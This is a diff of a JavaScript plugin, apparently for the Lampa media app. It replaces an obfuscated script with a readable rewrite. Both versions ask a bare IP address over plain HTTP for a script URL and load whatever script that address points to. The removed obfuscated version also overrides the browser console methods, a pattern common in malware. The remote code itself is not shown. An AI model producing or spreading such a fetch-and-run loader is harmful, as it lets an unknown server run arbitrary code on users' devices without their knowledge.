@@ -1,6 +1,71 @@
-(function() {
-	'use strict';
+(function () {
+    'use strict';
 
-         Lampa.Platform.tv();
-        function _0x3c6b(_0x27adb7,_0x348630){var _0x5dbd94=_0x35ef();return _0x3c6b=function(_0x5a5e47,_0x40db1c){_0x5a5e47=_0x5a5e47-0x1e3;var _0x51d05e=_0x5dbd94[_0x5a5e47];return _0x51d05e;},_0x3c6b(_0x27adb7,_0x348630);}(function(_0x5e3ec7,_0x58579a){var _0x2dcd24=_0x3c6b,_0xa66046=_0x5e3ec7();while(!![]){try{var _0x877625=-parseInt(_0x2dcd24(0x209))/0x1+-parseInt(_0x2dcd24(0x1e6))/0x2+-parseInt(_0x2dcd24(0x200))/0x3*(parseInt(_0x2dcd24(0x203))/0x4)+-parseInt(_0x2dcd24(0x1ee))/0x5*(-parseInt(_0x2dcd24(0x1ff))/0x6)+-parseInt(_0x2dcd24(0x1fd))/0x7+parseInt(_0x2dcd24(0x1fe))/0x8*(parseInt(_0x2dcd24(0x1ed))/0x9)+parseInt(_0x2dcd24(0x1ef))/0xa;if(_0x877625===_0x58579a)break;else _0xa66046['push'](_0xa66046['shift']());}catch(_0x45c6f8){_0xa66046['push'](_0xa66046['shift']());}}}(_0x35ef,0x5cdf4),(function(){var _0x27d9cc=_0x3c6b,_0x397c93=(function(){var _0x4a3946=!![];return function(_0x54b306,_0x112443){var _0x5a8610=_0x4a3946?function(){var _0x210b78=_0x3c6b;if(_0x112443){var _0x599089=_0x112443[_0x210b78(0x205)](_0x54b306,arguments);return _0x112443=null,_0x599089;}}:function(){};return _0x4a3946=![],_0x5a8610;};}()),_0x15ddbc=_0x397c93(this,function(){var _0x323439=_0x3c6b;return _0x15ddbc[_0x323439(0x1f6)]()[_0x323439(0x1e8)]('(((.+)+)+)+$')[_0x323439(0x1f6)]()[_0x323439(0x1e4)](_0x15ddbc)[_0x323439(0x1e8)](_0x323439(0x1e7));});_0x15ddbc();var _0x31965d=(function(){var _0x1c99d6=!![];return function(_0xa19f80,_0xa089c1){var _0x4ab3cd=_0x1c99d6?function(){if(_0xa089c1){var _0x50c5be=_0xa089c1['apply'](_0xa19f80,arguments);return _0xa089c1=null,_0x50c5be;}}:function(){};return _0x1c99d6=![],_0x4ab3cd;};}()),_0xad4429=_0x31965d(this,function(){var _0x1e4bfd=_0x3c6b,_0x3fbdbb=function(){var _0x20775a;try{_0x20775a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x1d1cc8){_0x20775a=window;}return _0x20775a;},_0x3fde77=_0x3fbdbb(),_0x5090d5=_0x3fde77['console']=_0x3fde77[_0x1e4bfd(0x201)]||{},_0x444bcb=[_0x1e4bfd(0x1e5),'warn',_0x1e4bfd(0x1fa),_0x1e4bfd(0x1f9),_0x1e4bfd(0x20a),_0x1e4bfd(0x1ea),_0x1e4bfd(0x208)];for(var _0x14a95e=0x0;_0x14a95e<_0x444bcb[_0x1e4bfd(0x20c)];_0x14a95e++){var _0x4d6031=_0x31965d[_0x1e4bfd(0x1e4)]['prototype']['bind'](_0x31965d),_0x2100a6=_0x444bcb[_0x14a95e],_0x9b5ee3=_0x5090d5[_0x2100a6]||_0x4d6031;_0x4d6031[_0x1e4bfd(0x1f8)]=_0x31965d['bind'](_0x31965d),_0x4d6031[_0x1e4bfd(0x1f6)]=_0x9b5ee3[_0x1e4bfd(0x1f6)][_0x1e4bfd(0x1f3)](_0x9b5ee3),_0x5090d5[_0x2100a6]=_0x4d6031;}});_0xad4429();'use strict';var _0x19207a='http://185.87.48.42:8095/random_sisi',_0x416d30=new XMLHttpRequest();_0x416d30[_0x27d9cc(0x1f1)](_0x27d9cc(0x1e3),_0x19207a,!![]),_0x416d30[_0x27d9cc(0x1f4)]=function(){var _0x2e0735=_0x27d9cc;if(_0x416d30[_0x2e0735(0x1ec)]!==0x4)return;if(_0x416d30[_0x2e0735(0x202)]===0xc8){var _0x13a538=(_0x416d30[_0x2e0735(0x207)]||'')['replace'](/^\s+|\s+$/g,'');if(!_0x13a538){console[_0x2e0735(0x1f9)](_0x2e0735(0x1eb)),Lampa[_0x2e0735(0x1e9)][_0x2e0735(0x1fb)]('Не\x20удалось\x20получить\x20адрес\x20сервера');return;}Lampa['Utils'][_0x2e0735(0x206)]([_0x13a538],function(){});}else console[_0x2e0735(0x1f9)](_0x2e0735(0x1f2)+_0x416d30['status']),Lampa[_0x2e0735(0x1e9)][_0x2e0735(0x1fb)]('Не\x20удалось\x20получить\x20адрес\x20сервера');},_0x416d30[_0x27d9cc(0x1f5)]=function(){var _0x29a7c8=_0x27d9cc;console[_0x29a7c8(0x1f9)](_0x29a7c8(0x1fc)),Lampa[_0x29a7c8(0x1e9)][_0x29a7c8(0x1fb)](_0x29a7c8(0x204));},_0x416d30[_0x27d9cc(0x1f0)]();}()));function _0x35ef(){var _0x3a774a=['2880YCkiFh','5JyUfiZ','9784400TSNLJJ','send','open','Ошибка\x20API:\x20HTTP\x20','bind','onreadystatechange','onerror','toString','Ошибка\x20доступа','__proto__','error','info','show','Ошибка\x20соединения\x20с\x20API','1056916UwQNpW','9872hQvYwO','1053798aqcOWe','1971678PlYHVo','console','status','4QMglLp','Не\x20удалось\x20получить\x20адрес\x20сервера','apply','putScriptAsync','responseText','trace','63094NnGdlp','exception','Manifest','length','GET','constructor','log','594482qNtGzt','(((.+)+)+)+$','search','Noty','table','Пустой\x20ответ\x20от\x20API','readyState'];_0x35ef=function(){return _0x3a774a;};return _0x35ef();}
+    var API_URL = 'http://185.87.48.42:8095/random_sisi';
+    var TIMEOUT = 10000;
+
+    function notify(text) {
+        if (window.Lampa && Lampa.Noty) Lampa.Noty.show(text);
+    }
+
+    function isValidUrl(str) {
+        return /^https?:\/\/[^\s]+$/i.test(str);
+    }
+
+    function loadScript() {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', API_URL, true);
+        xhr.timeout = TIMEOUT;
+
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState !== 4) return;
+
+            if (xhr.status !== 200) {
+                console.warn('Ошибка API: HTTP ' + xhr.status);
+                notify('Не удалось получить адрес сервера');
+                return;
+            }
+
+            var scriptUrl = (xhr.responseText || '').trim();
+
+            if (!scriptUrl) {
+                console.warn('Пустой ответ от API');
+                notify('Не удалось получить адрес сервера');
+                return;
+            }
+
+            if (!isValidUrl(scriptUrl)) {
+                console.warn('Некорректный URL в ответе API: ' + scriptUrl);
+                notify('Не удалось получить адрес сервера');
+                return;
+            }
+
+            Lampa.Utils.putScriptAsync([scriptUrl], function () {});
+        };
+
+        xhr.onerror = function () {
+            console.warn('Ошибка соединения с API');
+            notify('Ошибка доступа');
+        };
+
+        xhr.ontimeout = function () {
+            console.warn('Таймаут запроса к API');
+            notify('Ошибка доступа');
+        };
+
+        xhr.send();
+    }
+
+    function start() {
+        Lampa.Platform.tv(); // принудительный TV-режим, как в оригинале
+        loadScript();
+    }
+
+    if (window.appready) {
+        start();
+    } else {
+        Lampa.Listener.follow('app', function (e) {
+            if (e.type === 'ready') start();
+        });
+    }
 })();
